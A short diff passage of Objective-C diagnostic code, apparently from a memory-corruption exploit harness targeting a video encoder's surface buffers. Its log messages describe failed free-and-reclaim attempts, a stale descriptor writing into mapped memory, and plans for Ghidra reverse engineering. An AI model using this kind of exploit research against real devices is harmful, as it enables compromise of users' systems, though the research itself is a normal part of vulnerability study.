+        INFO(@"   with unmap. ARM→FREE→CLONE can never succeed.");
+        INFO(@"   → Need D-prep-2-style keep-alive variant.");
+        INFO(@"5. Write hit a surface ISR memcpy doesn't copy into output.");
+        INFO(@"   (corruption in coded buffer but not in CMSampleBuffer).");
+        INFO(@"   → Need Ghidra surface-index mapping of ISR memcpy source.");
         if (inputDiffs > 0) {
             PASS(@"BUT: Input surface DID change (%d bytes)!", inputDiffs);
             LOG(@"The stale descriptor hit an external mapping — this is");
